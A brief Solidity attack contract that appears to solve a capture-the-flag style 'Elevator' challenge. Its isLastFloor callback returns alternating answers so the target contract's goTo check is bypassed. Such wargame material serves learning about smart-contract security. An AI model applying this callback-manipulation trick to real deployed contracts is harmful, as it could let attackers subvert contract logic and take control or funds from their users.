// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ElevatorInterface{
    function goTo(uint256 _floor) external;
}

contract AttackElevator{
    bool public top;

    function isLastFloor(uint256 _floor) public returns (bool) {
        top = !top;
        return top;
    }

    function attack(address _elevator) public {
        top = true;
        ElevatorInterface elevator = ElevatorInterface(_elevator);
        elevator.goTo(1);
    }
}